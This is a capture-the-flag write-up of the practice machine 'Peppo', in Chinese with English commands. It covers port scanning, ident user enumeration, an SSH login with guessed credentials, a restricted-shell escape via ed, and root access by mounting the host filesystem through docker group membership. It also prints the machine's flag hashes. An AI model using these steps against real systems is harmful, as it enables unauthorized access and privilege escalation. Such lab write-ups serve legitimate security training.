###### tags: `Offsec` `PG Practice` `Hard` `Linux`

# Peppo
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.60 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.60:22
Open 192.168.172.60:113
Open 192.168.172.60:5432
Open 192.168.172.60:8080
Open 192.168.172.60:10000

PORT      STATE SERVICE           REASON  VERSION
22/tcp    open  ssh               syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
113/tcp   open  ident             syn-ack FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        syn-ack PostgreSQL DB 12.3 - 12.4
8080/tcp  open  http              syn-ack WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open  snet-sensor-mgmt? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 26 Apr 2024 07:46:40 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 26 Apr 2024 07:46:33 GMT
|     Connection: close
|_    Hello World
|_auth-owners: eleanor
```

用[113 - Pentesting Ident](https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident#ident-user-enum)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ident-user-enum 192.168.172.60 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.172.60:22       root
192.168.172.60:113      nobody
192.168.172.60:5432     <unknown>
192.168.172.60:8080     <unknown>
192.168.172.60:10000    eleanor
```

利用`eleanor/eleanor`登入ssh，又跟上次一樣有`-rbash`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh eleanor@192.168.172.60

Warning: Permanently added '192.168.172.60' (ED25519) to the list of known hosts.
eleanor@192.168.172.60's password: eleanor

eleanor@peppo:~$ 
eleanor@peppo:~$ cat local.txt
-rbash: cat: command not found
```

查看`/bin`，並到[GTFOBins](https://gtfobins.github.io/gtfobins/ed/#shell)使用`ed`指令可以得bash，再改`PATH`
```
eleanor@peppo:~$ ls -al bin
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Jul  9  2020 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch

eleanor@peppo:~$ ed
!/bin/sh

/bin:/bineppo:~$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/
eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```

可在`/home/eleanor`得local.txt
```
eleanor@peppo:~$ cat local.txt
4efcbfe70e9ae3219ccbbbcd952a40b0
```

剛有查看id，有`docker`的群組，查看[GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)
```
eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

eleanor@peppo:/tmp$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        3 years ago         542MB
postgres            latest              adf2b126dda8        3 years ago         313MB

eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# whoami
root
# cd /root
# cat proof.txt
bd399ab8c6bdb1e7a3aff0d02b77fdb4
```

---